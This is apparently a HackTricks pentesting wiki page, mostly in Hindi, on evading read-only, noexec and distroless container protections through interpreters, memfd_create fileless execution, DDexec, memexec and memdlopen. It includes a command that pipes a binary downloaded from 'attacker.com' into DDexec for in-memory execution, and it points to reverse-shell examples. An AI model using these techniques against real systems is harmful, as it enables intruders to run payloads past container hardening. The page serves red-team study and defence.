# Bypass FS protections: read-only / no-exec / Distroless

## Videos

निम्नलिखित videos में इस page पर बताई गई techniques को अधिक विस्तार से समझाया गया है:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

किसी container में security context में **`readOnlyRootFilesystem: true`** सेट करके root filesystem को read-only mount किया जा सकता है।<sup>[[3]](#references)</sup> उदाहरण:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only root अलग से mount किए गए volumes को read-only नहीं बनाता। Docker **`/dev/shm`** को IPC mount के रूप में मानता है, जबकि `rw` और `noexec` जैसे tmpfs options runtime configuration choices हैं; इनमें से किसी behavior पर निर्भर करने से पहले target container के mount options की जाँच करें।<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Red-team के perspective से, यह combination उन binaries को download और execute करना कठिन बना सकता है जो पहले से उपलब्ध नहीं हैं (जैसे backdoors या enumeration tools)।<sup>[[4]](#references)[[5]](#references)</sup>

## सबसे आसान bypass: Scripts

किसी `noexec` mount पर direct execution of binaries को block करता है, लेकिन कोई interpreter script को पढ़ और interpret कर सकता है। इसलिए, यदि `sh` या `python` मौजूद है, तो उस interpreter के माध्यम से shell या Python script चला सकते हैं।<sup>[[5]](#references)</sup>

जब आवश्यक tool स्वयं एक binary हो, तब यह मदद नहीं करता।<sup>[[5]](#references)</sup>

## Memory Bypasses

जब mounted path से direct execution block हो, तो एक option ELF को memory में load करके in-memory path के माध्यम से execute करना है। इससे उस mount पर `noexec` check से बचा जा सकता है, लेकिन अन्य kernel, permission या policy controls हटते नहीं हैं।<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

यदि कोई scripting runtime संबंधित Linux interface तक पहुँच सकता है, तो वह **`memfd_create(2)`** के साथ एक anonymous, RAM-backed file descriptor बना सकता है, उसमें ELF bytes लिख सकता है और fd-backed execution path का उपयोग कर सकता है। [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project इस workflow के लिए compressed और base64-encoded Python, Perl या Ruby code generate करता है।<sup>[[6]](#references)[[7]](#references)</sup>

यह project वर्तमान में Python, Perl और Ruby targets को document करता है; PHP या Node के लिए अलग runtime-specific technique या extension की आवश्यकता होती है। इसलिए किसी language के लिए इस generator का उपलब्ध न होना यह नहीं दर्शाता कि in-memory execution असंभव है।<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> **`/dev/shm`** में लिखा गया regular executable उस mount की **`noexec`** setting के अधीन रहता है; केवल उसे ordinary file descriptor के माध्यम से खोलने से mount policy नहीं बदलती।<sup>[[5]](#references)</sup>
>
> Exact memory-execution method runtime, architecture, kernel और उपलब्ध permissions पर भी निर्भर करता है।<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) **`/proc/self/mem`** के माध्यम से running shell process में stager और loader लिखता है, फिर control उस code को transfer करता है।<sup>[[8]](#references)</sup>

इससे process उस supplied binary को पहले executable filesystem पर रखे बिना load कर सकता है।<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** **memory** से shellcode या binary को load और **execute** कर सकता है।<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
इस technique के बारे में अधिक जानकारी के लिए Github देखें या:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) एक daemonized DDexec implementation है। इसका daemon arguments और raw program bytes वाले requests सुनता है, प्रत्येक program को load और run करने के लिए child को fork करता है, और parent को server के रूप में बनाए रखता है।<sup>[[9]](#references)</sup>

Repository में [a.php](https://github.com/arget13/memexec/blob/main/a.php) में **memexec का उपयोग करके PHP reverse shell से binaries execute करने** का एक example शामिल है।<sup>[[9]](#references)</sup>

### Memdlopen

DDexec के समान purpose के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) shared object या program के लिए एक fileless `dlopen()` implementation है। इसका README वर्तमान में ARM64 support document करता है, इसलिए इसका उपयोग करने से पहले target architecture जाँच लें।<sup>[[10]](#references)</sup>

## Distroless Bypass

**distroless वास्तव में क्या है**, यह कब मदद करता है, कब नहीं करता, और containers में post-exploitation tradecraft को कैसे बदलता है, इसकी dedicated explanation के लिए देखें:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless क्या है

Distroless images में केवल application और उसकी runtime dependencies होती हैं; official images में package managers, shells और standard Linux distribution में अपेक्षित अन्य programs शामिल नहीं होते।<sup>[[11]](#references)</sup>

Runtime image को केवल इन dependencies तक सीमित रखने से production में मौजूद software और जिसे scan तथा track करना आवश्यक है, उसकी मात्रा कम हो जाती है।<sup>[[11]](#references)</sup>

### Reverse Shell

Distroless container में regular shell के लिए **`sh` या `bash` उपलब्ध नहीं हो सकते**, और `ls`, `whoami` या `id` जैसी common utilities भी नहीं मिल सकती हैं।<sup>[[11]](#references)</sup>

> [!WARNING]
> इसलिए, सामान्य shell-based reverse shell या utility-based enumeration काम नहीं कर सकता।<sup>[[11]](#references)</sup>

यदि compromised application में कोई language runtime शामिल है (उदाहरण के लिए, Flask application के लिए Python या Node application के लिए Node.js), तो RCE अभी भी command channel और अपनी APIs के माध्यम से system inspection के लिए उस runtime का उपयोग कर सकता है।<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> उपलब्ध scripting language का उपयोग करके उसकी language capabilities के माध्यम से **system को enumerate करें**।<sup>[[12]](#references)</sup>

यदि कोई **read-only/no-exec** protections नहीं हैं, तो command channel किसी writable, executable mount में binaries लिखकर उन्हें run कर सकता है; पहले mount options और permissions verify करें।<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> जब ये protections मौजूद हों, तो जहाँ runtime, kernel और permissions अनुमति दें, वहाँ ऊपर दी गई **memory-execution techniques** का उपयोग करें।<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE vulnerabilities का exploitation करके scripting-language **reverse shells** प्राप्त करने और memory से binaries execute करने के **examples** [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में मिल सकते हैं।<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Stealth और Evasion के लिए Linux Memory Manipulation की खोज](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng और in-memory dlopen() के साथ Stealth intrusions - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod या Container के लिए Security Context configure करें](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
